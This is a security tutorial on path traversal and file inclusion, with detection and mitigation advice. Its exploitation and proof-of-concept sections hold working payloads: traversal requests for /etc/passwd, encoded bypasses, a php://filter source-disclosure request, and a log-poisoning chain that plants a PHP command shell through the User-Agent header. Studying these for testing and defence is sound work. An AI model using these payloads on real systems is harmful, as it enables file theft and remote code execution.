📌 Path Traversal (Directory Traversal) – Complete Guide

Accessing files outside the web root by manipulating file path inputs. Linux, Windows, encoding bypasses, PHP wrappers, and log poisoning.

🧠 Description

What is Path Traversal?

Path Traversal (also known as Directory Traversal) is a web vulnerability that allows attackers to access files and directories stored outside the web root folder. By manipulating variables that reference files with ../ (dot-dot-slash) sequences and their variants, attackers can read arbitrary files on the server, including source code, configuration files, credentials, and system files.

Why does it occur?

Insufficient input validation and sanitisation when handling file paths. The application trusts user-supplied input and uses it directly in file system operations without proper checks.

Security principle violated: Input Validation / Access Control

🏷️ Classification

  • Type: Path Traversal / Directory Traversal
  • OWASP: A01:2021 – Broken Access Control
  • CWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory

🎯 Attack Surface (Where to Test)

  • ✅ File download parameters (?file=, ?path=, ?doc=, ?page=)
  • ✅ Template inclusion (?template=, ?theme=)
  • ✅ Image/PDF generation from file paths
  • ✅ Log file viewers
  • ✅ Backup/download functionality
  • ✅ Language file selection (?lang=)

🔍 Detection Methodology

1. Static Analysis

  • Search for file read functions: file_get_contents(), fopen(), readfile(), include(), require()
  • Check if user input is passed directly to these functions without sanitisation

2. Dynamic Analysis (Burp Suite / Manual)

  • Inject ../../../etc/passwd in parameters
  • Observe response for file contents or error messages
  • Try different traversal depths (../ repeated)
  • Test encoding variations if basic is filtered

Tools: Burp Suite, dotdotpwn, ffuf, OWASP ZAP

📂 Types of Path Traversal Attacks

  • Local File Inclusion (LFI): Reading local files (source code, config, passwords)
  • Source Code Disclosure: Exposing application source code via PHP wrappers
  • Log Poisoning (LFI to RCE): Injecting malicious code into logs then including them
  • Directory Listing: Enumerating directory contents (if directory listing is enabled)

🔥 Log Poisoning – LFI to Remote Code Execution

# Step 1: Inject malicious PHP code into User-Agent
User-Agent: <?php system($_GET['cmd']); ?>

# Step 2: Include the log file
?file=../../../../var/log/apache2/access.log&cmd=id

# Step 3: Execute commands via the injected parameter
?file=../../../../var/log/apache2/access.log&cmd=whoami

Common log file paths:

  • /var/log/apache2/access.log
  • /var/log/apache2/error.log
  • /var/log/nginx/access.log
  • /var/log/nginx/error.log
  • /proc/self/environ (if readable)

⚙️ Exploitation Steps

  1. Identify a file inclusion parameter (?file=, ?path=, ?page=).
  2. Inject ../../../etc/passwd and observe response.
  3. If blocked, try encoding variants (URL, double URL, Unicode).
  4. Try absolute paths (/etc/passwd).
  5. Use PHP wrappers to read source code (php://filter).
  6. Attempt log poisoning by injecting PHP code into User-Agent, then include the log file.
  7. Escalate to RCE by executing commands via the injected code.

🛡️ Mitigation

✅ Use allowlist of allowed files: Only permit specific filenames, never user‑controlled paths.
✅ Store files outside web root: Keep static files in a directory not accessible via URL.
✅ Disable dangerous PHP wrappers: Set allow_url_fopen = Off and allow_url_include = Off.
✅ Use chrooted environments: Restrict the application to a jailed directory.
✅ Normalise input: Remove ../, ..\, and encoded variants before processing.
✅ Apply principle of least privilege: Run web server with limited user permissions.
✅ Regular security audits: Scan for path traversal vulnerabilities using automated tools.

⚠️ Risk / Impact

Severity: High

Impact:
  • Disclosure of sensitive files (/etc/passwd, /etc/shadow, application source code, database credentials)
  • Source code exposure (leading to further vulnerabilities)
  • Potential Remote Code Execution (via log poisoning or PHP wrappers)
  • Leakage of internal network information (/etc/hosts, /proc/net)

📎 Proof of Concept (PoC)

# Basic path traversal
curl "https://target.com/download?file=../../../../etc/passwd"

# URL encoded
curl "https://target.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# PHP wrapper to read source code
curl "https://target.com/index.php?page=php://filter/convert.base64-encode/resource=config"

# Log poisoning (inject PHP into User-Agent)
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "https://target.com/"
# Then include the log
curl "https://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id"

# Automated scanning with dotdotpwn
dotdotpwn -m http -u "https://target.com/download?file=TRAVERSAL" -k "root:x"
